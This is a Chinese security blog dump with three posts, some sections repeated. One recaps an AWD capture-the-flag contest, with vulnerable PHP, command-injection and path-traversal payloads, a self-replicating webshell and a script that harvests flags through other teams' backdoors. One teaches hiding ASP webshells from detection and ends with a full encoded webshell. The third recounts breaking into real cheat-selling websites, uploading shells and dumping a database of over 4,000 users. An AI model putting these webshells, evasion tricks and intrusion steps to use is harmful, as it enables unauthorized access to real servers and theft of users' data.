$username; $_SESSION['id'] = $row['id']; $_SESSION['icon'] = $row['icon']; echo \"\"; }else{ echo \"\"; } } ?\u003e 可以看到直接把接收到了$username给带入到了sql语句中，产生注入 直接用万能密码就可以绕过 接着往下看登录之后可以做什么 info.php if (isset($_FILES)) { if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"错误：\" . $_FILES[\"file\"][\"error\"] . \" \"; } else { $type = $_FILES[\"file\"][\"type\"]; if($type==\"image/jpeg\"){ $name =$_FILES[\"file\"][\"name\"] ; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo \"\"; } else { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"assets/images/avatars/\" . $_FILES[\"file\"][\"name\"]); $helper = new sqlhelper(); $sql = \"UPDATE admin SET icon='$name' WHERE id=$_SESSION[id]\"; $helper-\u003eexecute_dml($sql); } }else{ echo \"\"; } } } 可以看到他对文件类型的判断仅仅是if($type==\"image/jpeg\") 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在assets/images/avatars/目录下。 但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:1","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#注入上传"},{"categories":["技术文章"],"content":"\r3.2 WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！ 3.2.1 预留后门\rpww.php跟pass.php都是冰蝎。。。 不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门 index.php里面就是一个普通的一句话 3.2.2 命令注入我们可以看到D盾还报了一个exec后门 直接把$host双引号里带入 然后看一下$host是怎么来的 然后看数据是如何放入数据库的 在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠 但是实际上在执行的$r = exec(\"ping -c 1 $host\");这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。 因为exec是没有回显的，所以构造以下payload ||cat /flag \u003e /ver/www/html/1.txt 把flag输出到网站根目录下 好像是需要登录，具体我也忘了 3.2.3 任意文件读取img.php \u003c?php $file = $_GET['img']; $img = file_get_contents('images/icon/'.$file); //使用图片头输出浏览器 header(\"Content-Type: image/jpeg;text/html; charset=utf-8\"); echo $img; exit; payload:/img.php?img=../../../../../../../flag 3.2.4 反序列化同web1，只不过不需要x参数了 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:2","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#web2"},{"categories":["技术文章"],"content":"\r3.2 WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！ 3.2.1 预留后门\rpww.php跟pass.php都是冰蝎。。。 不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门 index.php里面就是一个普通的一句话 3.2.2 命令注入我们可以看到D盾还报了一个exec后门 直接把$host双引号里带入 然后看一下$host是怎么来的 然后看数据是如何放入数据库的 在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠 但是实际上在执行的$r = exec(\"ping -c 1 $host\");这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。 因为exec是没有回显的，所以构造以下payload ||cat /flag \u003e /ver/www/html/1.txt 把flag输出到网站根目录下 好像是需要登录，具体我也忘了 3.2.3 任意文件读取img.php \u003c?php $file = $_GET['img']; $img = file_get_contents('images/icon/'.$file); //使用图片头输出浏览器 header(\"Content-Type: image/jpeg;text/html; charset=utf-8\"); echo $img; exit; payload:/img.php?img=../../../../../../../flag 3.2.4 反序列化同web1，只不过不需要x参数了 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:2","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#预留后门-1"},{"categories":["技术文章"],"content":"\r3.2 WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！ 3.2.1 预留后门\rpww.php跟pass.php都是冰蝎。。。 不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门 index.php里面就是一个普通的一句话 3.2.2 命令注入我们可以看到D盾还报了一个exec后门 直接把$host双引号里带入 然后看一下$host是怎么来的 然后看数据是如何放入数据库的 在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠 但是实际上在执行的$r = exec(\"ping -c 1 $host\");这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。 因为exec是没有回显的，所以构造以下payload ||cat /flag \u003e /ver/www/html/1.txt 把flag输出到网站根目录下 好像是需要登录，具体我也忘了 3.2.3 任意文件读取img.php \u003c?php $file = $_GET['img']; $img = file_get_contents('images/icon/'.$file); //使用图片头输出浏览器 header(\"Content-Type: image/jpeg;text/html; charset=utf-8\"); echo $img; exit; payload:/img.php?img=../../../../../../../flag 3.2.4 反序列化同web1，只不过不需要x参数了 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:2","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#命令注入"},{"categories":["技术文章"],"content":"\r3.2 WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！ 3.2.1 预留后门\rpww.php跟pass.php都是冰蝎。。。 不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门 index.php里面就是一个普通的一句话 3.2.2 命令注入我们可以看到D盾还报了一个exec后门 直接把$host双引号里带入 然后看一下$host是怎么来的 然后看数据是如何放入数据库的 在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠 但是实际上在执行的$r = exec(\"ping -c 1 $host\");这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。 因为exec是没有回显的，所以构造以下payload ||cat /flag \u003e /ver/www/html/1.txt 把flag输出到网站根目录下 好像是需要登录，具体我也忘了 3.2.3 任意文件读取img.php \u003c?php $file = $_GET['img']; $img = file_get_contents('images/icon/'.$file); //使用图片头输出浏览器 header(\"Content-Type: image/jpeg;text/html; charset=utf-8\"); echo $img; exit; payload:/img.php?img=../../../../../../../flag 3.2.4 反序列化同web1，只不过不需要x参数了 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:2","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#任意文件读取"},{"categories":["技术文章"],"content":"\r3.2 WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！ 3.2.1 预留后门\rpww.php跟pass.php都是冰蝎。。。 不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门 index.php里面就是一个普通的一句话 3.2.2 命令注入我们可以看到D盾还报了一个exec后门 直接把$host双引号里带入 然后看一下$host是怎么来的 然后看数据是如何放入数据库的 在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠 但是实际上在执行的$r = exec(\"ping -c 1 $host\");这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。 因为exec是没有回显的，所以构造以下payload ||cat /flag \u003e /ver/www/html/1.txt 把flag输出到网站根目录下 好像是需要登录，具体我也忘了 3.2.3 任意文件读取img.php \u003c?php $file = $_GET['img']; $img = file_get_contents('images/icon/'.$file); //使用图片头输出浏览器 header(\"Content-Type: image/jpeg;text/html; charset=utf-8\"); echo $img; exit; payload:/img.php?img=../../../../../../../flag 3.2.4 反序列化同web1，只不过不需要x参数了 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:2","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#反序列化-1"},{"categories":["技术文章"],"content":"\r3.3 WEB3能利用起来的好像就这一个洞，当时也没来得及看 3.3.1 命令执行\rexport.php \u003c?php if (isset($_POST['name'])){ $name = $_POST['name']; exec(\"tar -cf backup/$name images/*.jpg\"); echo \"\u003cdiv class=\\\"alert alert-success\\\" role=\\\"alert\\\"\u003e 导出成功,\u003ca href='backup/$name'\u003e点击下载\u003c/a\u003e\u003c/div\u003e\"} ?\u003e 老套路，同web2 payload: || cat /flag \u003e /var/www/html/1.txt || ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:3","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#web3"},{"categories":["技术文章"],"content":"\r3.3 WEB3能利用起来的好像就这一个洞，当时也没来得及看 3.3.1 命令执行\rexport.php \u003c?php if (isset($_POST['name'])){ $name = $_POST['name']; exec(\"tar -cf backup/$name images/*.jpg\"); echo \"","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:3","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#命令执行"},{"categories":["技术文章"],"content":"\r4 艰难的权限维持其实AWD比赛刚开始的时候，最重要的是维持权限而不是急着交flag。 当我还在审第一个web的时候，看到预留后门就问队友要不要给他框架弹个shell 结果他告诉我框架爆炸了。。。弹shell一直500。。。 缓缓打出三个问号。。。喵喵喵？？？ 以前都是用团队的这个框架没问题，结果今天死活连不上。。。。 GG，这tm咋整啊，31个队手工维权玩个毛啊 所以就只能搞一些骚操作 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:4:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#艰难的权限维持"},{"categories":["技术文章"],"content":"\r4.1 循环批量GET FLAG\r撸了一串脚本，来回跑，然后加上接口自动提交，没有框架只能这样了 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:4:1","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#循环批量get-flag"},{"categories":["技术文章"],"content":"\r4.2 乌鸦坐飞机对，没错，我们就是乌鸦，坐了别的队的飞机。 自己靶机的流量日志上发现了别的队伍的payload 写了个脚本看了下，几乎所有的队伍都被种上了这个师傅的马 不死马循环写入，被删后马上复活 你的马看起来不错，下一秒就是我的了。 白嫖了好几轮的flag 然后闲的没事想着不如连上蚁剑看看吧，找找其他师傅的马 批量导入一下 看见其他队伍被种了马，满怀热泪的帮他们删了站。 有一个队伍被命令注入打惨了，也帮他们删个站吧。 当然还看到不少其他队伍的马 甚至还有批量上waf的py脚本 毕竟是其他队伍的内部脚本，象征性打个码 流量日志里还发现一个狼人队伍的循环感染不死马 会遍历目录把所有的php文件头部加上后门 \u003c?php if (md5($_REQUEST['pass'])===\"8e68ca4946b8e146a408f727eaf9da7c\"){@eval($_REQUEST['code']);@system($_REQUEST['sys']);} ?\u003e 不过惊讶的是他的md5居然可以解开 somd5牛逼！ 好马，下一秒就是我的了 批量脚本走起 import requests import json url=\"http://39.100.119.37:{0}{1}80/login/index.php?pass=Happy.Every.Day\u0026code=system('cat /flag');\" def submit(flag): hosturl=\"http://39.100.119.37:10000/commit/flag\" data={'flag':flag,\"token\":\"xxxxx\"} data=json.dumps(data) r=requests.post(hosturl,data=data,headers={\"Cookie\":\"PHPSESSID=xxxxx\",\"Content-Type\":\"application/json; charset=UTF-8\"}) print(r.text) for j in range(1,4): for i in range(1,32): i=str(i).zfill(2) url1=url.format(j,i) print(url1) try: res=requests.get(url=url1) if 'flag' in res.text: submit(res.text[0:38]) print(res.text[0:38]) except: pass ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:4:2","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#乌鸦坐飞机"},{"categories":["技术文章"],"content":"\r5 尾声最后web基本上都修了，payload已经打不动了 只能靠不死马来get flag 因为开始手快，得分比较多，还有负责修的队友比较给力，掉分不是很多。 然而毕竟是白嫖别人的马，所以增长分数的速度越来越慢 最后还往后掉了一名，不过还拿个小奖hhhhh ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:5:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#尾声"},{"categories":["技术文章"],"content":"\r6 总结师傅们一个个都心狠手辣，但是说到最后还是自己有很多没有考虑到的地方。 因为框架主要是需要先弹个shell到自己的服务器，然后才能自动维权，get flag等一系列操作 但是开始框架崩了后直接懵了，不知道怎么办 其实现在想自己完全可以当时重写一个批量种不死马的脚本来维权 但是当时31个队伍，三个一堆洞的web，难免有些手忙脚乱。 有些队伍的通防很厉害，匹配到关键字直接返回一个假的flag，自己准备也写一个。 怀疑他们用的都是一家的脚本。。。。返回的flag都一样 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:6:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#总结"},{"categories":["技术文章"],"content":"\r7 最后AWD一般都是线下赛，线上AWD见得还不多。 星盟的这个线上赛体验还是很不错的，能够撑住31个队伍，每个队伍5个题也是挺厉害的 中途虽然平台有宕机但是很快就恢复了。 给星盟点个赞，希望星盟以后越做越好~ ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:7:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#最后"},{"categories":["技术文章"],"content":"\r1 前言授人以鱼不如授人以渔 所以准备给星球写一份免杀的系列文章 让大家自己掌握免杀的一些技巧跟方法，这样即使脚本失效也不用每次都催着我更新了 正好前一段时间有成员问我asp免杀的问题，那就先拿asp开刀吧。 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:1:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:2:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#正文"},{"categories":["技术文章"],"content":"\r2.1 第一步，确定免杀目标比如普通的asp一句话就是 \u003c% eval(request(\"mr6\"))%\u003e 或者 \u003c% execute request(\"mr6\") %\u003e 也就是说你的shell在一系列操作之后要达到这种效果 因为eval execute在asp中类似一种语言结构，除了大小写之外不能对其进行变化 所以我们混淆的重点主要是后面的request(\"mr6\")参数 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:2:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#第一步确定免杀目标"},{"categories":["技术文章"],"content":"\r2.2 第二步，打开语法手册百度搜一个asp语法手册 https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp 查找到字符串有关的函数，随便选一个 他这里只是显示了一部分，我就拿unescape来举例子 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:2:2","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#第二步打开语法手册"},{"categories":["技术文章"],"content":"\r2.3 第三步，混淆unescape在asp中相当于php的urldecode，就是url编码 所以先把payload给编码一遍 为了增强混淆的效果，所以采用burp的decoder模块，因为burp是对所有字符进行编码。 扫一下，发现四级 提示eval参数xxxx 那么我们定义个函数传进去呢 发现已经降到了一级 但是我们的目标是做到0级 继续分析一下查杀的原因是参数test(xxxx) 随便改一下参数内容试一下 当我们传入123456时还是报一级，说明这时D盾查杀的只是调用，而跟你传什么东西没有关系 把参数删掉试试 此时D盾就不再提示了 所以我们只需要构造一个无参数函数即可 \u003c% Function test(): dim aaa aaa=\"%65%76%61%6c%28%72%65%71%75%65%73%74%28%22%6d%72%36%22%29%29\" test = unescape(aaa) End Function eval(test()) %\u003e 成功bypass D盾 使用蚁剑成功连接 原理都是一样的，一个函数被杀了就换一个函数 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:2:3","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#第三步混淆"},{"categories":["技术文章"],"content":"\r3 反思拓展既然我们可以把任意的payload编码一下然后eval，那么我们是否可以用同样的办法实现对任意文件免杀？ 答案当然是可以的 但是我们前提是要说明一点区别 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:3:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#反思拓展"},{"categories":["技术文章"],"content":"\r3.1 eval与execute\r3.1.1 Eval 计算一个表达式的值并返回结果语法：[result = ]Eval(expression) expression 为任意有效 VBScript 表达式的字符串 示例：response.Write(eval(“3+2”)) ‘输出 5 “3+2” 使用引号括起来，表示是一个字符串，但是在 Eval “眼里”，把它当作一个表达式 3+2 来执行。 3.1.2 Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开语法：Execute statements 示例：Execute “response.Write(““abc””)” ‘输出 abc “response.Write(““abc””)” 使用引号括起来，表示是一个字符串，但是在 Execute “眼里”，把它当作一个语句 response.Write(“abc”) 来执行。 也就是说对于小马来说只有一句话，所以两者用哪个都可以 但是大马是多句，就不能用eval来执行了，而要用execute ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:3:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#eval与execute"},{"categories":["技术文章"],"content":"\r3.1 eval与execute\r3.1.1 Eval 计算一个表达式的值并返回结果语法：[result = ]Eval(expression) expression 为任意有效 VBScript 表达式的字符串 示例：response.Write(eval(“3+2”)) ‘输出 5 “3+2” 使用引号括起来，表示是一个字符串，但是在 Eval “眼里”，把它当作一个表达式 3+2 来执行。 3.1.2 Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开语法：Execute statements 示例：Execute “response.Write(““abc””)” ‘输出 abc “response.Write(““abc””)” 使用引号括起来，表示是一个字符串，但是在 Execute “眼里”，把它当作一个语句 response.Write(“abc”) 来执行。 也就是说对于小马来说只有一句话，所以两者用哪个都可以 但是大马是多句，就不能用eval来执行了，而要用execute ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:3:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#eval-计算一个表达式的值并返回结果"},{"categories":["技术文章"],"content":"\r3.1 eval与execute\r3.1.1 Eval 计算一个表达式的值并返回结果语法：[result = ]Eval(expression) expression 为任意有效 VBScript 表达式的字符串 示例：response.Write(eval(“3+2”)) ‘输出 5 “3+2” 使用引号括起来，表示是一个字符串，但是在 Eval “眼里”，把它当作一个表达式 3+2 来执行。 3.1.2 Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开语法：Execute statements 示例：Execute “response.Write(““abc””)” ‘输出 abc “response.Write(““abc””)” 使用引号括起来，表示是一个字符串，但是在 Execute “眼里”，把它当作一个语句 response.Write(“abc”) 来执行。 也就是说对于小马来说只有一句话，所以两者用哪个都可以 但是大马是多句，就不能用eval来执行了，而要用execute ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:3:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#execute-执行一个或多个指定的语句多个语句间用冒号隔开"},{"categories":["技术文章"],"content":"\r4 具体实现首先随便找个大马 \u003c% on error resume next %\u003e \u003c% if request(\"pass\")=\"g\" then '在这修改密码 session(\"pw\")=\"go\" end if %\u003e \u003c%if session(\"pw\")\u003c\u003e\"go\" then %\u003e \u003c%=\"\u003ccenter\u003e\u003cbr\u003e\u003cform action='' method='post'\u003e\"%\u003e \u003c%=\"\u003cinput name='pass' type='password' size='10'\u003e \u003cinput \"%\u003e\u003c%=\"type='submit' value='test'\u003e\u003c/center\u003e\"%\u003e \u003c%else%\u003e \u003c% set fso=server.createobject(\"scripting.filesystemobject\") path=request(\"path\") if path\u003c\u003e\"\" then data=request(\"da\") set da=fso.createtextfile(path,true) da.write data if err=0 then %\u003e \u003c%=\"yes\"%\u003e \u003c%else%\u003e \u003c%=\"no\"%\u003e \u003c% end if err.clear end if da.close %\u003e \u003c%set da=nothing%\u003e \u003c%set fos=nothing%\u003e \u003c%=\"\u003cform action='' method=post\u003e\"%\u003e \u003c%=\"\u003cinput type=text name=path\u003e\"%\u003e \u003c%=\"\u003cbr\u003e\"%\u003e \u003c%=\"当前文件路径:\"\u0026server.mappath(request.servervariables(\"script_name\"))%\u003e \u003c%=\"\u003cbr\u003e\"%\u003e \u003c%=\"操作系统为:\"\u0026Request.ServerVariables(\"OS\")%\u003e \u003c%=\"\u003cbr\u003e\"%\u003e \u003c%=\"WEB服务器版本为:\"\u0026Request.ServerVariables(\"SERVER_SOFTWARE\")%\u003e \u003c%=\"\u003cbr\u003e\"%\u003e \u003c%=\"服务器的IP为:\"\u0026Request.ServerVariables(\"LOCAL_ADDR\")%\u003e \u003c%=\"\u003cbr\u003e\"%\u003e \u003c%=\"\"%\u003e \u003c%=\"\u003ctextarea name=da cols=50 rows=10 width=30\u003e\u003c/textarea\u003e\"%\u003e \u003c%=\"\u003cbr\u003e\"%\u003e \u003c%=\"\u003cinput type=submit value=save\u003e\"%\u003e \u003c%=\"\u003c/form\u003e\"%\u003e \u003c%end if%\u003e 因为只是举例子，就找一个具有文件保存的大马 扫一下不出意外的被杀 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:4:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#具体实现"},{"categories":["技术文章"],"content":"\r4.1 代码处理首先把多余的标签给去掉，只留下中间的代码 如果采用url编码的话一定要去掉里面所有的中文！ 否则会一直报未结束的字符串常量错误 on error resume next if request(\"pass\")=\"g\" then session(\"pw\")=\"go\" end if if session(\"pw\")\u003c\u003e\"go\" then response.write(\"\u003ccenter\u003e\u003cbr\u003e\u003cform action='' method='post'\u003e\") response.write(\"\u003cinput name='pass' type='password' size='10'\u003e \u003cinput \") response.write(\"type='submit' value='test'\u003e\u003c/center\u003e\") else set fso=server.createobject(\"scripting.filesystemobject\") path=request(\"path\") if path\u003c\u003e\"\" then data=request(\"da\") set da=fso.createtextfile(path,true) da.write data if err=0 then response.write(\"yes\") else response.write(\"no\") end if err.clear end if da.close set da=nothing set fos=nothing response.write(\"\u003cform action='' method=post\u003e\") response.write(\"\u003cinput type=text name=path\u003e\") response.write(\"\u003cbr\u003e\") response.write(\"path:\"\u0026server.mappath(request.servervariables(\"script_name\"))) response.write(\"\u003cbr\u003e\") response.write(\"os:\"\u0026Request.ServerVariables(\"OS\")) response.write(\"\u003cbr\u003e\") response.write(\"WEB:\"\u0026Request.ServerVariables(\"SERVER_SOFTWARE\")) response.write(\"\u003cbr\u003e\") response.write(\"IP:\"\u0026Request.ServerVariables(\"LOCAL_ADDR\")) response.write(\"\u003cbr\u003e\") response.write(\"\") response.write(\"\u003ctextarea name=da cols=50 rows=10 width=30\u003e\u003c/textarea\u003e\") response.write(\"\u003cbr\u003e\") response.write(\"\u003cinput type=submit value=save\u003e\") response.write(\"\u003c/form\u003e\") end if 然后扔到burp里进行url编码 然后外层包裹上执行代码 \u003c% execute (unescape(\"%6f%6e%20%65%72%72%6f%72%20%72%65%73%75%6d%65%20%6e%65%78%74%0a%20%20%69%66%20%72%65%71%75%65%73%74%28%22%70%61%73%73%22%29%3d%22%67%22%20%74%68%65%6e%0a%20%20%73%65%73%73%69%6f%6e%28%22%70%77%22%29%3d%22%67%6f%22%0a%20%20%65%6e%64%20%69%66%0a%69%66%20%73%65%73%73%69%6f%6e%28%22%70%77%22%29%3c%3e%22%67%6f%22%20%74%68%65%6e%20%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%63%65%6e%74%65%72%3e%3c%62%72%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%27%20%6d%65%74%68%6f%64%3d%27%70%6f%73%74%27%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%27%70%61%73%73%27%20%74%79%70%65%3d%27%70%61%73%73%77%6f%72%64%27%20%73%69%7a%65%3d%27%31%30%27%3e%20%3c%69%6e%70%75%74%20%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%74%79%70%65%3d%27%73%75%62%6d%69%74%27%20%76%61%6c%75%65%3d%27%31%32%33%27%3e%3c%2f%63%65%6e%74%65%72%3e%22%29%0a%65%6c%73%65%0a%0a%73%65%74%20%66%73%6f%3d%73%65%72%76%65%72%2e%63%72%65%61%74%65%6f%62%6a%65%63%74%28%22%73%63%72%69%70%74%69%6e%67%2e%66%69%6c%65%73%79%73%74%65%6d%6f%62%6a%65%63%74%22%29%0a%70%61%74%68%3d%72%65%71%75%65%73%74%28%22%70%61%74%68%22%29%0a%69%66%20%70%61%74%68%3c%3e%22%22%20%74%68%65%6e%0a%64%61%74%61%3d%72%65%71%75%65%73%74%28%22%64%61%22%29%0a%73%65%74%20%64%61%3d%66%73%6f%2e%63%72%65%61%74%65%74%65%78%74%66%69%6c%65%28%70%61%74%68%2c%74%72%75%65%29%0a%64%61%2e%77%72%69%74%65%20%64%61%74%61%0a%69%66%20%65%72%72%3d%30%20%74%68%65%6e%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%79%65%73%22%29%0a%65%6c%73%65%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%6e%6f%22%29%0a%65%6e%64%20%69%66%0a%65%72%72%2e%63%6c%65%61%72%0a%65%6e%64%20%69%66%0a%64%61%2e%63%6c%6f%73%65%0a%73%65%74%20%64%61%3d%6e%6f%74%68%69%6e%67%0a%73%65%74%20%66%6f%73%3d%6e%6f%74%68%69%6e%67%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%27%20%6d%65%74%68%6f%64%3d%70%6f%73%74%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%74%79%70%65%3d%74%65%78%74%20%6e%61%6d%65%3d%70%61%74%68%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%70%61%74%68%3a%22%26%73%65%72%76%65%72%2e%6d%61%70%70%61%74%68%28%72%65%71%75%65%73%74%2e%73%65%72%76%65%72%76%61%72%69%61%62%6c%65%73%28%22%73%63%72%69%70%74%5f%6e%61%6d%65%22%29%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%6f%73%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%4f%53%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:4:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#代码处理"},{"categories":["技术文章"],"content":"\r5 最后套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。 ","date":"2019-10-02","objectID":"/posts/webshell-bypass-asp/:5:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之ASP","uri":"/posts/webshell-bypass-asp/#最后"},{"categories":["技术文章"],"content":"\r1 前言因为最近吃鸡被外挂打自闭了，所以准备也让那些卖挂的体会一下什么叫做自闭。 昨天晚上爬了快1000个卖吃鸡外挂的平台 你们这些卖挂的，等我有空了一个一个捶。 发现大多数都是用的一套aspx的程序，可惜没有源码不能白盒审计，黑盒也找不到什么洞 只能找找软柿子捏 昨天晚上一口气锤了四个 基本上都有宝塔 不过php-venom 4 系列加上配套的编码器过宝塔稳得一批 脱了裤子发现里面4000+孤儿 今天晚上又锤了一个吃鸡外挂站 可惜尴尬的是没有写入权限 写篇大水文记录一下 ","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:1:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:2:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#正文"},{"categories":["技术文章"],"content":"\r2.1 毫无套路进后台\r这个应该算是那种推广站，里面什么都没有，只有宣传内容 管你是什么，照锤不误。 看了一下是织梦二次开发的站 后台很容易进，这里大家都明白什么意思。 ","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:2:1","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#毫无套路进后台"},{"categories":["技术文章"],"content":"\r2.2 玄学后台发现后台删了很多功能，特别是织梦的坑货文件管理器 但是从经验上来说很多这种二次开发的并不是真的把编辑器删掉了，只是在后台页面不显示了。 审查元素启动 随便找个链接改一下，替换成media_main.php?dopost=filemanager 然后点击，果然找到了文件管理器页面 上传shell 本来以为就这样结束了 结果发现虽然提示上传成功但是啥都没有 还以为是waf，就换了人畜无害的一张jpg上去也是啥都没有 以为是目录权限问题 找到session的临时文件，上传，照样不行 图就不放了，总之就是传不上去 觉得可能是整站没写权限 随手试试删除功能，发现可以删文件 emmmmm，所以到底是有权限没有呢 一般来说没写权限的话也就没有修改权限，也就是没有删除权限 想着是不是上传功能坏了，换个方法getshell吧 